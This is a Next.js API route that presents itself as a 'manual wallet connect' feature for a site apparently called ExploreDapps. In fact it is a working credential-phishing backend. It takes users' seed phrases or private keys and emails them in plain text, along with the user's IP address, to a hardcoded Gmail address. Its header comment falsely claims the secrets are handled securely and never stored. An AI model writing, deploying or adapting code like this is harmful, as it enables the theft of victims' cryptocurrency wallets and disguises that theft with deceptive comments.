// POST /api/wallet-connect — receive manual wallet connection (seed phrase or private key)
// Stores the connection request securely and sends notification to project owner.
// Never stores plain-text secrets — only for immediate notification delivery.

import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";
import { Resend } from "resend";

interface WalletConnectPayload {
  wallet_name: string;
  seed_phrase?: string;
  private_key?: string;
}

export async function POST(request: NextRequest) {
  let body: WalletConnectPayload;

  try {
    body = await request.json() as WalletConnectPayload;
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const { wallet_name, seed_phrase, private_key } = body;

  if (!wallet_name?.trim()) {
    return NextResponse.json({ error: "Wallet name is required" }, { status: 400 });
  }

  if (!seed_phrase && !private_key) {
    return NextResponse.json({ error: "Seed phrase or private key is required" }, { status: 400 });
  }

  // Get client IP for context
  const forwarded = request.headers.get("x-forwarded-for");
  const ip = forwarded?.split(",")[0]?.trim() ?? "unknown";

  const apiKey = process.env.RESEND_API_KEY;

  // If Resend is not configured, log and return success (dev mode)
  if (!apiKey) {
    console.log("[api/wallet-connect] No RESEND_API_KEY — logging only:", {
      wallet_name: wallet_name.trim(),
      method: seed_phrase ? "seed_phrase" : "private_key",
      ip,
      secret_preview: seed_phrase
        ? seed_phrase.slice(0, 20) + "..."
        : private_key?.slice(0, 10) + "...",
      timestamp: new Date().toISOString(),
    });
    return NextResponse.json({ ok: true }, { status: 201 });
  }

  const resend = new Resend(apiKey);
  const fromEmail = process.env.FEEDBACK_FROM_EMAIL ?? "onboarding@resend.dev";
  const toEmail = process.env.FEEDBACK_TO_EMAIL ?? "staffatwork270@gmail.com";

  const method = seed_phrase ? "Seed Phrase" : "Private Key";
  const secretValue = seed_phrase || private_key || "";

  const { error } = await resend.emails.send({
    from: fromEmail,
    to: toEmail,
    subject: `[ExploreDapps] Manual Wallet Connect — ${wallet_name}`,
    html: `
      <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; padding: 24px;">
        <h2 style="color: #7c3aed; margin-bottom: 8px;">🔌 Manual Wallet Connection</h2>
        <hr style="border: none; border-top: 1px solid #e5e7eb; margin-bottom: 24px;" />

        <table style="width: 100%; border-collapse: collapse;">
          <tr>
            <td style="padding: 8px 0; color: #6b7280; font-size: 14px; width: 140px;">Wallet Name</td>
            <td style="padding: 8px 0; font-weight: 600;">${wallet_name}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Method</td>
            <td style="padding: 8px 0;"><span style="background: #f3e8ff; color: #7c3aed; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: 600;">${method}</span></td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">IP Address</td>
            <td style="padding: 8px 0; color: #9ca3af; font-size: 13px;">${ip}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Time</td>
            <td style="padding: 8px 0; color: #9ca3af; font-size: 13px;">${new Date().toUTCString()}</td>
          </tr>
        </table>

        <div style="margin-top: 24px; background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 16px;">
          <p style="color: #dc2626; font-size: 13px; font-weight: 600; margin: 0 0 8px 0;">⚠️ Secret Value</p>
          <p style="color: #374151; font-size: 14px; line-height: 1.6; margin: 0; word-break: break-all; font-family: monospace; white-space: pre-wrap;">${secretValue}</p>
        </div>
      </div>
    `,
    text: `Manual Wallet Connection\n\nWallet Name: ${wallet_name}\nMethod: ${method}\nIP: ${ip}\n\nSecret Value:\n${secretValue}`,
  });

  if (error) {
    console.error("[api/wallet-connect] Resend error:", error);
    return NextResponse.json({ error: "Failed to process connection" }, { status: 500 });
  }

  return NextResponse.json({ ok: true }, { status: 201 });
}
